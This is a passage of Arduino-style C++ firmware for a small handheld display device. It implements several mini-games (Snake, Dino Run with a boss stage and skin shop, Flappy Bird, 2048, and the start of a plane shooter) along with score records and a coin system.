      for (int i=0;i<snakeLen-1 && !dead;i++) if (snakeX[i]==nx && snakeY[i]==ny) dead=true;
      if (dead) {
        gameReward(score/2+2);
        pet2TaskAdd(6,1); pet2TaskSet(7,score);
        tft.fillRect(30,25,100,40,TFT_BLACK);
        tft.drawString("GAME OVER",38,30); tft.drawString("S:"+String(score),55,44);
        delay(2500); return;
      }
      for (int i=snakeLen-1;i>0;i--) { snakeX[i]=snakeX[i-1]; snakeY[i]=snakeY[i-1]; }
      snakeX[0]=nx; snakeY[0]=ny;
      if (nx==foodX && ny==foodY) {
        score++; if (snakeLen<200) snakeLen++;
        bool ok=false;
        while (!ok) { foodX=random(COLS); foodY=random(ROWS); ok=true; for (int i=0;i<snakeLen;i++) if (snakeX[i]==foodX && snakeY[i]==foodY) { ok=false; break; } }
        if (moveInterval>150) moveInterval-=3;
      }
    }
    tft.fillRect(1,14,158,65,TFT_BLACK);
    tft.drawRoundRect(0,13,160,67,3,TFT_DARKGREEN);
    int fx=OX+foodX*CELL+CELL/2, fy=OY+foodY*CELL+CELL/2;
    tft.fillCircle(fx,fy,3,TFT_MAROON); tft.fillCircle(fx,fy,2,TFT_RED); tft.drawPixel(fx,fy,TFT_WHITE);
    for (int i=snakeLen-1;i>=0;i--) {
      int px=OX+snakeX[i]*CELL, py=OY+snakeY[i]*CELL;
      if (i==0) {
        tft.fillRoundRect(px,py,CELL-1,CELL-1,2,TFT_GREEN);
        int ex1,ey1,ex2,ey2;
        if (dir==0) { ex1=px+1; ey1=py+1; ex2=px+3; ey2=py+1; }
        else if (dir==1) { ex1=px+3; ey1=py+1; ex2=px+3; ey2=py+3; }
        else if (dir==2) { ex1=px+1; ey1=py+3; ex2=px+3; ey2=py+3; }
        else { ex1=px+1; ey1=py+1; ex2=px+1; ey2=py+3; }
        tft.drawPixel(ex1,ey1,TFT_BLACK); tft.drawPixel(ex2,ey2,TFT_BLACK);
      } else if (i==1) tft.fillRoundRect(px,py,CELL-1,CELL-1,2,TFT_GREEN);
      else { uint16_t col=(i%2==0)?TFT_DARKGREEN:0x03E0; tft.fillRoundRect(px,py,CELL-1,CELL-1,2,col); }
    }
    delay(8);
  }
}
// ==================== Dino Run ====================
void drawDinoSprite(int x, int y, bool legUp, bool ducking, uint16_t color) {
  if (ducking) {
    tft.fillRoundRect(x,y-9,22,9,3,color);
    tft.fillRoundRect(x+18,y-11,9,7,2,color);
    tft.fillRect(x+23,y-9,2,2,TFT_BLACK);
    tft.fillRect(x+27,y-8,2,1,TFT_BLACK);
    tft.fillRect(x-2,y-5,4,2,color);
    if (legUp) { tft.fillRect(x+3,y-3,2,3,color); tft.fillRect(x+11,y-2,2,2,color); tft.fillRect(x+17,y-3,2,3,color); }
    else { tft.fillRect(x+3,y-2,2,2,color); tft.fillRect(x+11,y-3,2,3,color); tft.fillRect(x+17,y-2,2,2,color); }
  } else {
    tft.fillRoundRect(x,y-14,13,10,3,color);
    tft.fillRect(x+8,y-19,4,6,color);
    tft.fillRoundRect(x+9,y-23,9,6,2,color);
    tft.fillRect(x+14,y-22,2,2,TFT_BLACK);
    tft.fillRect(x+17,y-20,3,1,TFT_BLACK);
    tft.fillRect(x-3,y-12,4,2,color);
    tft.fillRect(x-5,y-14,3,3,color);
    if (legUp) { tft.fillRect(x+2,y-4,3,4,color); tft.fillRect(x+8,y-2,3,2,color); }
    else { tft.fillRect(x+2,y-2,3,2,color); tft.fillRect(x+8,y-4,3,4,color); }
  }
}
void drawCactusSprite(int x, int groundY, int type) {
  if (type==0) {
    tft.fillRect(x,groundY-8,3,8,TFT_WHITE);
    tft.fillRect(x-3,groundY-6,3,2,TFT_WHITE);
    tft.fillRect(x+3,groundY-5,3,2,TFT_WHITE);
  } else {
    tft.fillRect(x,groundY-12,4,12,TFT_WHITE);
    tft.fillRect(x-4,groundY-9,4,2,TFT_WHITE);
    tft.fillRect(x+4,groundY-7,4,2,TFT_WHITE);
  }
}
void drawCloud(int x, int y) {
  tft.fillCircle(x + 6,  y + 3, 4, TFT_WHITE);
  tft.fillCircle(x + 12, y + 2, 5, TFT_WHITE);
  tft.fillCircle(x + 18, y + 3, 4, TFT_WHITE);
  tft.fillRect(x + 4, y + 3, 16, 4, TFT_WHITE);
  tft.fillCircle(x + 10, y + 1, 3, TFT_WHITE);
  tft.fillCircle(x + 15, y + 1, 3, TFT_WHITE);
}

bool rectRect(int ax1,int ay1,int ax2,int ay2, int bx1,int by1,int bx2,int by2) {
  return ax1 <= bx2 && ax2 >= bx1 && ay1 <= by2 && ay2 >= by1;
}
bool circleRect(int cx,int cy,int r, int x1,int y1,int x2,int y2) {
  int nx = cx; if (nx < x1) nx = x1; if (nx > x2) nx = x2;
  int ny = cy; if (ny < y1) ny = y1; if (ny > y2) ny = y2;
  int dx = cx - nx, dy = cy - ny;
  return dx*dx + dy*dy <= r*r;
}

#define MAX_BOSS_BULLETS 8
struct BossBullet { float x, y, vx, vy; bool active; };
BossBullet bossBullets[MAX_BOSS_BULLETS];
const int BOSS_TRIGGER_DISTANCE = 1000;
const unsigned long BOSS_SHOT_PERIOD = 1800;
const unsigned long BOSS_WIN_TIME    = 120000;
const float BOSS_BULLET_SPEED = 2.0f;
const int BOSS_W = 22, BOSS_H = 14;
const int BOSS_X = 132, BOSS_Y = 16;

void drawBoss(int x, int y) {
  tft.fillTriangle(x + 3, y + 5, x - 3, y - 2, x + 9, y + 5, TFT_RED);
  tft.fillTriangle(x + 19, y + 5, x + 25, y - 2, x + 13, y + 5, TFT_RED);
  tft.fillRoundRect(x, y + 2, BOSS_W, BOSS_H, 4, 0xD000);
  tft.fillCircle(x + 18, y + 7, 5, 0xD000);
  tft.fillCircle(x + 18, y + 6, 2, TFT_YELLOW);
  tft.drawPixel(x + 19, y + 6, TFT_BLACK);
  tft.fillTriangle(x + 4, y + 2, x + 6, y - 3, x + 8, y + 2, TFT_ORANGE);
  tft.fillTriangle(x + 12, y + 2, x + 14, y - 3, x + 16, y + 2, TFT_ORANGE);
  tft.fillTriangle(x + 22, y + 9, x + 27, y + 11, x + 22, y + 13, TFT_ORANGE);
}

void dinoShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Records",80,4,1);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  char buf[32];
  tft.drawString("Best Dist:",4,24);
  snprintf(buf,sizeof(buf),"%d m",dinoData.bestDistance);
  tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(buf,4,38);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Best Cactus:",4,54);
  snprintf(buf,sizeof(buf),"%d",dinoData.bestCactus);
  tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString(buf,4,68);
  tft.setTextColor(TFT_WHITE,TFT_BLACK); waitExit();
}
void dinoShowShop() {
  int sel=0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawString("Shop",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),120,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    for (int i=0;i<DINO_SKIN_COUNT;i++) {
      int y=14+i*11;
      bool owned=(dinoData.ownedSkins>>i)&1;
      bool current=(dinoData.currentSkin==i);
      String line=((i==sel)?"> ":"  ")+String(DINO_SKINS[i].name);
      if (current) line+=" *"; else if (!owned) line+=" $"+String(DINO_SKINS[i].cost); else line+=" (owned)";
      if (i==sel) tft.setTextColor(TFT_YELLOW,TFT_BLACK); else tft.setTextColor(DINO_SKINS[i].color,TFT_BLACK);
      tft.drawString(line,2,y);
    }
    char k=getKey();
    if (k=='U') sel=(sel+DINO_SKIN_COUNT-1)%DINO_SKIN_COUNT;
    else if (k=='D') sel=(sel+1)%DINO_SKIN_COUNT;
    else if (k=='L') {
      bool owned=(dinoData.ownedSkins>>sel)&1;
      if (owned) { dinoData.currentSkin=sel; dinoSave(); }
      else if (pet2.coins>=DINO_SKINS[sel].cost) {
        pet2.coins-=DINO_SKINS[sel].cost; dinoData.ownedSkins|=(1<<sel); dinoData.currentSkin=sel;
        pet2Save(); dinoSave();
      }
    } else if (k=='R'||k=='E') break;
    delay(30);
  }
}
void dinoGamePlay() {
  clearAll();
  const int GROUND_Y=72;
  int dinoX=15, dinoY=GROUND_Y;
  float dinoVY=0;
  bool onGround=true, legUp=false;
  unsigned long lastLeg=millis();
  int distance=0, cactusCount=0;
  #define DINO_MAX_OBS 4
  struct Obs { int x; int type; bool active; };
  Obs obs[DINO_MAX_OBS];
  for (int i=0;i<DINO_MAX_OBS;i++) obs[i].active=false;
  unsigned long lastSpawn=millis(); int spawnInterval=1400;

  bool bossActive = false;
  unsigned long bossStartTime = 0, lastBossShot = 0;
  bool bossWin = false;
  for (int i=0;i<MAX_BOSS_BULLETS;i++) bossBullets[i].active=false;

  uint16_t skinColor=DINO_SKINS[dinoData.currentSkin].color;
  bool gameOver=false;
  bool recordShown=false; unsigned long recordShownAt=0;
  int bossShotCount = 0;

  while (!gameOver) {
    char k=getGameKey();
    if (k=='U' && onGround) { dinoVY=-4.0; onGround=false; }
    bool ducking=(digitalRead(BTN_DOWN)==LOW);
    if (k=='L') { recordShown=true; recordShownAt=millis(); }
    if (k=='R'||k=='E') {
      if (distance>dinoData.bestDistance) dinoData.bestDistance=distance;
      if (cactusCount>dinoData.bestCactus) dinoData.bestCactus=cactusCount;
      dinoSave(); return;
    }
    if (!onGround) { dinoY+=dinoVY; dinoVY+=0.4; if (dinoY>=GROUND_Y) { dinoY=GROUND_Y; dinoVY=0; onGround=true; } }
    if (millis()-lastLeg>100) { lastLeg=millis(); legUp=!legUp; }
    unsigned long now=millis();

    if (!bossActive && distance >= BOSS_TRIGGER_DISTANCE) {
      bossActive = true;
      bossStartTime = now;
      lastBossShot = now;
    }

    if (now-lastSpawn>(unsigned long)spawnInterval) {
      lastSpawn=now;
      for (int i=0;i<DINO_MAX_OBS;i++) {
        if (!obs[i].active) {
          obs[i].active=true; obs[i].x=160;
          int r=random(10);
          if (r<5) obs[i].type=0; else if (r<7) obs[i].type=1; else obs[i].type=2;
          break;
        }
      }
      int nextInterval = max(800, 1400-distance/5);
      if (bossActive) nextInterval = nextInterval * 3 / 2;
      spawnInterval = nextInterval;
    }
    int obsSpeed = 2 + distance / 600;
    if (obsSpeed > 5) obsSpeed = 5;
    for (int i=0;i<DINO_MAX_OBS;i++) {
      if (obs[i].active) {
        obs[i].x -= obsSpeed;
        if (obs[i].x<-20) {
          obs[i].active=false; distance+=10;
          if (obs[i].type!=2) cactusCount++;
        }
      }
    }

    int dl, dr, dt, db;
    if (ducking) { dl=dinoX; dr=dinoX+24; dt=dinoY-9; db=dinoY; }
    else { dl=dinoX; dr=dinoX+17; dt=dinoY-23; db=dinoY; }

    for (int i=0;i<DINO_MAX_OBS;i++) {
      if (!obs[i].active) continue;
      int ox = obs[i].x;
      if (obs[i].type==0) {
        if (rectRect(ox,      GROUND_Y-8,  ox+3,  GROUND_Y,   dl,dt,dr,db)) { gameOver=true; break; }
        if (rectRect(ox-3,    GROUND_Y-6,  ox,    GROUND_Y-4, dl,dt,dr,db)) { gameOver=true; break; }
        if (rectRect(ox+3,    GROUND_Y-5,  ox+6,  GROUND_Y-3, dl,dt,dr,db)) { gameOver=true; break; }
      } else if (obs[i].type==1) {
        if (rectRect(ox,      GROUND_Y-12, ox+4,  GROUND_Y,   dl,dt,dr,db)) { gameOver=true; break; }
        if (rectRect(ox-4,    GROUND_Y-9,  ox,    GROUND_Y-7, dl,dt,dr,db)) { gameOver=true; break; }
        if (rectRect(ox+4,    GROUND_Y-7,  ox+8,  GROUND_Y-5, dl,dt,dr,db)) { gameOver=true; break; }
      } else {
        int cx = ox - 8;
        if (circleRect(cx+6,  51, 4, dl,dt,dr,db)) { gameOver=true; break; }
        if (circleRect(cx+12, 50, 5, dl,dt,dr,db)) { gameOver=true; break; }
        if (circleRect(cx+18, 51, 4, dl,dt,dr,db)) { gameOver=true; break; }
        if (rectRect(cx+4, 51, cx+20, 55,  dl,dt,dr,db)) { gameOver=true; break; }
        if (circleRect(cx+10, 49, 3, dl,dt,dr,db)) { gameOver=true; break; }
        if (circleRect(cx+15, 49, 3, dl,dt,dr,db)) { gameOver=true; break; }
      }
    }

    if (bossActive && !gameOver) {
      if (now - lastBossShot > BOSS_SHOT_PERIOD) {
        lastBossShot = now;
        for (int i=0;i<MAX_BOSS_BULLETS;i++) {
          if (!bossBullets[i].active) {
            float sx = BOSS_X + 20;
            float sy = BOSS_Y + 12;
            float tx = dinoX + 6;
            float ty = 60.0f;
            if      (bossShotCount % 3 == 1) ty = 57.0f;
            else if (bossShotCount % 3 == 2) ty = 63.0f;
            bossShotCount++;
            float dx = tx - sx, dy = ty - sy;
            float len = sqrtf(dx*dx + dy*dy);
            if (len < 0.01f) len = 1.0f;
            bossBullets[i].x = sx;
            bossBullets[i].y = sy;
            bossBullets[i].vx = dx / len * BOSS_BULLET_SPEED;
            bossBullets[i].vy = dy / len * BOSS_BULLET_SPEED;
            bossBullets[i].active = true;
            break;
          }
        }
      }
      for (int i=0;i<MAX_BOSS_BULLETS;i++) {
        if (!bossBullets[i].active) continue;
        bossBullets[i].x += bossBullets[i].vx;
        bossBullets[i].y += bossBullets[i].vy;
        if (bossBullets[i].x < 0 || bossBullets[i].x > 160 ||
            bossBullets[i].y < 13 || bossBullets[i].y > 90) {
          bossBullets[i].active = false;
          continue;
        }
        if (circleRect((int)bossBullets[i].x, (int)bossBullets[i].y, 2, dl, dt, dr, db)) {
          gameOver = true; break;
        }
      }
      if (!gameOver && now - bossStartTime > BOSS_WIN_TIME) {
        bossWin = true;
        gameOver = true;
      }
    }

    tft.fillRect(0,13,160,67,TFT_BLACK);
    char infoBuf[32];
    snprintf(infoBuf,sizeof(infoBuf),"%dm  C:%d",distance,cactusCount);
    tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString(infoBuf,2,0);
    if (bossActive) {
      unsigned long remain = (BOSS_WIN_TIME - (now - bossStartTime)) / 1000;
      char bb[16];
      snprintf(bb,sizeof(bb),"BOSS %lus",remain);
      tft.setTextColor(TFT_RED,TFT_BLACK);
      tft.drawString(bb,60,0);
      tft.setTextColor(TFT_WHITE,TFT_BLACK);
    }
    tft.drawFastHLine(0,GROUND_Y+1,160,TFT_WHITE);
    drawDinoSprite(dinoX,dinoY,legUp,ducking,skinColor);
    for (int i=0;i<DINO_MAX_OBS;i++) {
      if (!obs[i].active) continue;
      if (obs[i].type==0||obs[i].type==1) drawCactusSprite(obs[i].x,GROUND_Y,obs[i].type);
      else drawCloud(obs[i].x - 8, 48);
    }
    if (bossActive) {
      drawBoss(BOSS_X, BOSS_Y);
      for (int i=0;i<MAX_BOSS_BULLETS;i++) {
        if (bossBullets[i].active) {
          tft.fillCircle((int)bossBullets[i].x, (int)bossBullets[i].y, 2, TFT_RED);
          tft.drawPixel((int)bossBullets[i].x, (int)bossBullets[i].y, TFT_YELLOW);
        }
      }
    }
    if (recordShown && millis()-recordShownAt<2000) {
      tft.fillRoundRect(20,20,120,30,4,TFT_BLACK);
      tft.drawRoundRect(20,20,120,30,4,TFT_CYAN);
      tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Best",80,24,1);
      snprintf(infoBuf,sizeof(infoBuf),"%dm / %dC",dinoData.bestDistance,dinoData.bestCactus);
      tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawCentreString(infoBuf,80,38,1);
    } else if (recordShown && millis()-recordShownAt>=2000) recordShown=false;
    delay(20);
  }

  if (distance>dinoData.bestDistance) dinoData.bestDistance=distance;
  if (cactusCount>dinoData.bestCactus) dinoData.bestCactus=cactusCount;
  dinoSave();

  clearAll();
  if (bossWin) {
    gameReward(distance/50+15);
    pet2TaskAdd(6,1); pet2TaskSet(7,distance);
    tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawCentreString("BOSS DODGED!",80,10,1);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    tft.drawString("Survived 120s",4,30);
    char buf[32];
    snprintf(buf,sizeof(buf),"Dist: %dm",distance);
    tft.drawString(buf,4,44);
  } else {
    gameReward(distance/50+3);
    pet2TaskAdd(6,1); pet2TaskSet(7,distance);
    tft.setTextColor(TFT_RED,TFT_BLACK); tft.drawCentreString("GAME OVER",80,10,1);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    char buf[32];
    snprintf(buf,sizeof(buf),"Dist: %dm",distance);
    tft.drawString(buf,4,30);
    snprintf(buf,sizeof(buf),"Cactus: %d",cactusCount);
    tft.drawString(buf,4,44);
  }
  while (true) { char k=getKey(); if (k=='R'||k=='E') break; delay(20); }
}
void showDinoRun() {
  deinitWifi(); deinitBLE();
  dinoLoad();
  int menuSel=0; bool inMenu=true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Dino Run",2,0);
    tft.setTextColor(TFT_YELLOW,TFT_BLACK); tft.drawString("$"+String(pet2.coins),130,0);
    tft.setTextColor(TFT_WHITE,TFT_BLACK);
    const char* items[]={"Start","Records","Shop"};
    for (int i=0;i<3;i++) { String pre=(i==menuSel)?"> ":"  "; tft.drawString(pre+items[i],2,20+i*14); }
    char k=getKey();
    if (k=='U') menuSel=(menuSel+2)%3;
    else if (k=='D') menuSel=(menuSel+1)%3;
    else if (k=='L') {
      if (menuSel==0) dinoGamePlay();
      else if (menuSel==1) dinoShowRecords();
      else if (menuSel==2) dinoShowShop();
      dinoLoad();
    } else if (k=='R'||k=='E') inMenu=false;
    delay(30);
  }
}

// ==================== Flappy Bird ====================
void flpShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 30);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(flpData.bestScore), 4, 44);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); waitExit();
}
void flpShowShop() {
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < FLP_SKIN_COUNT; i++) {
      int y = 14 + i * 11;
      bool owned = (flpData.ownedSkins >> i) & 1;
      bool current = (flpData.currentSkin == i);
      String line = ((i == sel) ? "> " : "  ") + String(FLP_SKINS[i].name);
      if (current) line += " *"; else if (!owned) line += " $" + String(FLP_SKINS[i].cost); else line += " (owned)";
      tft.setTextColor(i == sel ? TFT_YELLOW : FLP_SKINS[i].color, TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + FLP_SKIN_COUNT - 1) % FLP_SKIN_COUNT;
    else if (k == 'D') sel = (sel + 1) % FLP_SKIN_COUNT;
    else if (k == 'L') {
      bool owned = (flpData.ownedSkins >> sel) & 1;
      if (owned) { flpData.currentSkin = sel; flpSave(); }
      else if (pet2.coins >= FLP_SKINS[sel].cost) {
        pet2.coins -= FLP_SKINS[sel].cost; flpData.ownedSkins |= (1 << sel); flpData.currentSkin = sel;
        pet2Save(); flpSave();
      }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void drawFlappyBird(int x, int y, uint16_t color, float vy) {
  tft.fillRoundRect(x, y + 2, 8, 6, 3, color);
  tft.fillCircle(x + 7, y + 4, 3, color);
  tft.fillCircle(x + 8, y + 3, 1, TFT_WHITE);
  tft.drawPixel(x + 9, y + 3, TFT_BLACK);
  tft.fillTriangle(x + 10, y + 4, x + 14, y + 5, x + 10, y + 6, TFT_ORANGE);
  if (vy < 0) tft.fillRoundRect(x + 1, y, 5, 3, 1, TFT_WHITE);
  else        tft.fillRoundRect(x + 1, y + 6, 5, 3, 1, TFT_WHITE);
  tft.fillTriangle(x, y + 4, x - 3, y + 2, x - 3, y + 6, color);
}
void flpGamePlay() {
  clearAll();
  const int GROUND = 76;
  int birdY = 36;
  float birdVY = 0;
  int pipeX = 160, pipeGapY = 30;
  const int pipeW = 14, gapH = 42;
  int score = 0;
  bool dead = false;
  uint16_t birdColor = FLP_SKINS[flpData.currentSkin].color;
  while (!dead) {
    char k = getGameKey();
    if (k == 'U') birdVY = -3.5;
    if (k == 'R' || k == 'E') {
      if (score > flpData.bestScore) flpData.bestScore = score;
      flpSave(); return;
    }
    birdVY += 0.4; if (birdVY > 5) birdVY = 5;
    birdY += birdVY;
    pipeX -= 2;
    if (pipeX < -pipeW) { pipeX = 160; pipeGapY = random(5, GROUND - gapH - 5); score++; }
    if (birdY < 0 || birdY > GROUND - 10) dead = true;
    if (pipeX < 28 && pipeX + pipeW > 20) {
      if (birdY < pipeGapY || birdY > pipeGapY + gapH - 8) dead = true;
    }
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Score:" + String(score), 2, 0);
    tft.fillRect(pipeX, 0, pipeW, pipeGapY, 0x0400);
    tft.fillRect(pipeX - 2, pipeGapY - 4, pipeW + 4, 4, 0x07E0);
    tft.fillRect(pipeX, pipeGapY + gapH, pipeW, GROUND - (pipeGapY + gapH), 0x0400);
    tft.fillRect(pipeX - 2, pipeGapY + gapH, pipeW + 4, 4, 0x07E0);
    tft.fillRect(0, GROUND, 160, 4, 0x0400);
    tft.drawFastHLine(0, GROUND, 160, 0x07E0);
    drawFlappyBird(20, birdY, birdColor, birdVY);
    delay(30);
  }
  if (score > flpData.bestScore) flpData.bestScore = score;
  flpSave();
  gameReward(score/2+2);
  pet2TaskAdd(6, 1); pet2TaskSet(7, score);
  clearAll();
  tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Score: " + String(score), 4, 30);
  while (true) { char k = getKey(); if (k == 'R' || k == 'E') break; delay(20); }
}
void showFlappyBird() {
  deinitWifi(); deinitBLE(); flpLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Flappy Bird", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records", "Shop"};
    for (int i = 0; i < 3; i++) { String pre = (i == menuSel) ? "> " : "  "; tft.drawString(pre + items[i], 2, 20 + i * 14); }
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 2) % 3;
    else if (k == 'D') menuSel = (menuSel + 1) % 3;
    else if (k == 'L') {
      if (menuSel == 0) flpGamePlay();
      else if (menuSel == 1) flpShowRecords();
      else if (menuSel == 2) flpShowShop();
      flpLoad();
    } else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================== 2048 ====================
int g2Grid[4][4];
int g2Score = 0;
void g2Spawn() {
  int empty[16][2], n = 0;
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) if (g2Grid[y][x] == 0) { empty[n][0] = x; empty[n][1] = y; n++; }
  if (n == 0) return;
  int r = random(n);
  g2Grid[empty[r][1]][empty[r][0]] = (random(10) < 9) ? 2 : 4;
}
void g2Init() {
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) g2Grid[y][x] = 0;
  g2Score = 0; g2Spawn(); g2Spawn();
}
bool g2Move(int dir) {
  bool moved = false;
  if (dir == 0) {
    for (int x = 0; x < 4; x++) for (int y = 0; y < 4; y++) for (int yy = y + 1; yy < 4; yy++) {
      if (g2Grid[yy][x] == 0) continue;
      if (g2Grid[y][x] == 0) { g2Grid[y][x] = g2Grid[yy][x]; g2Grid[yy][x] = 0; moved = true; }
      else if (g2Grid[y][x] == g2Grid[yy][x]) { g2Grid[y][x] *= 2; g2Score += g2Grid[y][x]; g2Grid[yy][x] = 0; moved = true; }
      break;
    }
  } else if (dir == 1) {
    for (int x = 0; x < 4; x++) for (int y = 3; y >= 0; y--) for (int yy = y - 1; yy >= 0; yy--) {
      if (g2Grid[yy][x] == 0) continue;
      if (g2Grid[y][x] == 0) { g2Grid[y][x] = g2Grid[yy][x]; g2Grid[yy][x] = 0; moved = true; }
      else if (g2Grid[y][x] == g2Grid[yy][x]) { g2Grid[y][x] *= 2; g2Score += g2Grid[y][x]; g2Grid[yy][x] = 0; moved = true; }
      break;
    }
  } else if (dir == 2) {
    for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) for (int xx = x + 1; xx < 4; xx++) {
      if (g2Grid[y][xx] == 0) continue;
      if (g2Grid[y][x] == 0) { g2Grid[y][x] = g2Grid[y][xx]; g2Grid[y][xx] = 0; moved = true; }
      else if (g2Grid[y][x] == g2Grid[y][xx]) { g2Grid[y][x] *= 2; g2Score += g2Grid[y][x]; g2Grid[y][xx] = 0; moved = true; }
      break;
    }
  } else {
    for (int y = 0; y < 4; y++) for (int x = 3; x >= 0; x--) for (int xx = x - 1; xx >= 0; xx--) {
      if (g2Grid[y][xx] == 0) continue;
      if (g2Grid[y][x] == 0) { g2Grid[y][x] = g2Grid[y][xx]; g2Grid[y][xx] = 0; moved = true; }
      else if (g2Grid[y][x] == g2Grid[y][xx]) { g2Grid[y][x] *= 2; g2Score += g2Grid[y][x]; g2Grid[y][xx] = 0; moved = true; }
      break;
    }
  }
  return moved;
}
uint16_t g2TileColor(int v) {
  switch (v) {
    case 0: return 0x2104; case 2: return 0x8410; case 4: return 0xC618;
    case 8: return 0xFDA0; case 16: return 0xFB00; case 32: return 0xF800;
    case 64: return 0xF81F; case 128: return 0x07E0; case 256: return 0x07FF;
    case 512: return 0xFFE0; case 1024: return 0x07FF; case 2048: return 0xFFE0;
    default: return 0xFFFF;
  }
}
void g2Draw() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("2048  S:" + String(g2Score), 2, 0);
  int cellW = 34, cellH = 14;
  int ox = 12, oy = 14;
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) {
    int px = ox + x * cellW, py = oy + y * cellH;
    uint16_t c = g2TileColor(g2Grid[y][x]);
    tft.fillRoundRect(px, py, cellW - 2, cellH - 2, 2, c);
    if (g2Grid[y][x] > 0) {
      tft.setTextColor(TFT_BLACK, c);
      char b[8]; snprintf(b, sizeof(b), "%d", g2Grid[y][x]);
      tft.drawCentreString(b, px + cellW/2 - 1, py + 3, 1);
    }
  }
}
bool g2CanMove() {
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) {
    if (g2Grid[y][x] == 0) return true;
    if (x < 3 && g2Grid[y][x] == g2Grid[y][x+1]) return true;
    if (y < 3 && g2Grid[y][x] == g2Grid[y+1][x]) return true;
  }
  return false;
}
void g2GamePlay() {
  g2Init(); g2Draw();
  while (true) {
    char k = getGameKey();
    if (k == 'E') break;
    bool moved = false;
    if (k == 'U') moved = g2Move(0);
    else if (k == 'D') moved = g2Move(1);
    else if (k == 'L') moved = g2Move(2);
    else if (k == 'R') moved = g2Move(3);
    if (moved) {
      g2Spawn(); g2Draw();
      if (!g2CanMove()) {
        if (g2Score > g2Data.bestScore) g2Data.bestScore = g2Score;
        g2Save();
        gameReward(g2Score/50+3);
        pet2TaskAdd(6, 1); pet2TaskSet(7, g2Score);
        clearAll();
        tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 20, 1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString("Score: " + String(g2Score), 4, 40);
        while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
        return;
      }
    }
    delay(20);
  }
}
void g2ShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 30);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(g2Data.bestScore), 4, 44);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); waitExit();
}
void show2048() {
  deinitWifi(); deinitBLE(); g2Load();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("2048", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) { String pre = (i == menuSel) ? "> " : "  "; tft.drawString(pre + items[i], 2, 20 + i * 14); }
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') {
      if (menuSel == 0) g2GamePlay();
      else if (menuSel == 1) g2ShowRecords();
      g2Load();
    } else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================== 飞机大战 ====================
#define PLN_MAX_METEORS 4
#define PLN_MAX_EXPLOSIONS 8
struct PlnMeteor { int x, y, r; bool active; };
struct PlnExplosion { int x, y; int age; bool active; };
PlnMeteor plnMeteors[PLN_MAX_METEORS];
PlnExplosion plnExplosions[PLN_MAX_EXPLOSIONS];

void plnSpawnExplosion(int x, int y) {
  for (int i = 0; i < PLN_MAX_EXPLOSIONS; i++) {
    if (!plnExplosions[i].active) {
